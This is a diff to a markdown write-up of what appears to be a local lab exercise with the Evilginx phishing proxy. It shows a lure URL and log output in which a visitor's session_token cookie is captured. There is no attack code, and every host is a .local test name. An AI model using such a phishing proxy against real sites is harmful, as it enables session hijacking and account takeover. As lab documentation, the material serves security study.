@@ -101,6 +101,7 @@ by Kuba Gretzky (@mrgretzky)     version 3.3.0
 		https://login.evilginx3.local/eiyTwTXQ
 
 ## Captured the session token
+```bash 
 
 : 2024/12/04 16:14:15 [001] WARN: Cannot handshake client login.targetsite.local remote error: tls: unknown certificate authority
 [16:14:23] [imp] [0] [targetsite-local] new visitor has arrived: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 (10.0.2.15)
@@ -134,6 +135,5 @@ by Kuba Gretzky (@mrgretzky)     version 3.3.0
 [ cookies ]
 [{"path":"/","domain":"login.targetsite.local","expirationDate":1764865104,"value":"sibi2d083ecfn4shbco7i1ro5d--very-insecure-fixed-VALUE--DO-NOT-USE-IT-NEVER-IN-REAL-APPLICATION","name":"session_token","httpOnly":true,"hostOnly":true}]
 
-:  
-
+```
 
